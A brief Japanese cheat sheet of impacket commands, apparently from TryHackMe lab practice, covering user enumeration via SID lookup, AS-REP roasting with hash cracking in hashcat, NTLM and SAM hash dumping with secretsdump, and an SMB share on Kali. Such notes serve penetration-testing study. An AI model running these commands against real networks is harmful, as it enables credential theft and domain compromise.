# impacket

全然まとまっていないので、今後整理する

ユーザー名列挙

```sh
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@$TARGET
```

```sh
# ASREPRoasting攻撃 によるチケット取得。その後ハッシュをクラック。
# hashcat -m 18200 ./hash.txt ./passwords.txt
python3 /home/kali/tools/impacket/examples/GetNPUsers.py 'THM-AD/' -usersfile names.txt -no-pass -dc-ip 10.10.249.47
```

```sh
# NTLM ハッシュ抽出
python3 /home/kali/tools/impacket/examples/secretsdump.py -just-dc-ntlm THM-AD/backup@10.10.249.47
```

ファイル共有設定（kali）

```shell
$ mkdir share
$ python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support public share
```

パスワードハッシュ抽出

```sh
python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```
